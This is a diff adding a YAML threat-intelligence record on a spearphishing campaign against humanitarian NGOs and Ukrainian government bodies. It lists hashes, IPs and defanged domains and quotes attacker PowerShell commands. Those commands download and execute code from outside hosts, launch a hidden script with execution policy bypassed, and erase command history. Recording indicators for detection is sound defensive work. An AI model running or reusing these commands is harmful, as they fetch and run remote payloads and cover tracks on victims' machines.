@@ -1,0 +1,50 @@
+description: Coordinated spearphishing campaign targeting humanitarian NGOs and Ukrainian
+  government entities using weaponized PDFs, fake Cloudflare captcha pages, and a
+  WebSocket RAT.
+attribution: PhantomCaptcha (Russian FSB-linked threat cluster)
+malware_families:
+- WebSocket RAT
+TTPs:
+  processes: []
+  commandline: []
+  powershell:
+  - '"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NoProfile -NonInteractive
+    -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\\ProgramData\\Microsoft
+    Windows\\SystemHealthSvc.ps1"'
+  - iex ((New-Object System.Net.WebClient).DownloadString("hxxps://zoomconference.a"+"pp/cptch/${clientId}"))
+  - '[ScriptBlock]::Create( (New-Object System.Net.WebClient).DownloadString("hxxps://bsnowcommunications[.]com/maintenance")
+    )'
+  - Set-PSReadlineOption -HistorySaveStyle SaveNothing
+  - iex $command 2>&1 |Out-String
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: ''
+    destination: wss://bsnowcommunications[.]com:80
+    port: 80
+  file_activity:
+  - C:\\ProgramData\\Microsoft Windows\\SystemHealthSvc.ps1
+  - cptchand
+  - maintenance
+  - 19bcf7ca3df4e54034b57ca924c9d9d178f4b0b8c2071a350e310dd645cd2b23
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 19bcf7ca3df4e54034b57ca924c9d9d178f4b0b8c2071a350e310dd645cd2b23
+  - 3324550964ec376e74155665765b1492ae1e3bdeb35d57f18ad9aaca64d50a44
+  - 4bc8cf031b2e521f2b9292ffd1aefc08b9c00dab119f9ec9f65219a0fbf0f566
+  - e8d0943042e34a37ae8d79aeb4f9a2fa07b4a37955af2b0cc0e232b79c2e72f3
+  ip_addresses:
+  - 45.15.156.24
+  - 185.142.33.131
+  - 193.233.23.81
+  domains:
+  - bsnowcommunications[.]com
+  - goodhillsenterprise[.]com
+  - zoomconference[.]app
+  - zoomconference[.]click
+reference: https://www.sentinelone.com/labs/phantomcaptcha-multi-stage-websocket-rat-targets-ukraine-in-single-day-spearphishing-operation/
+date_of_publication: October 22, 2025
+file_creation_date: October 25, 2025
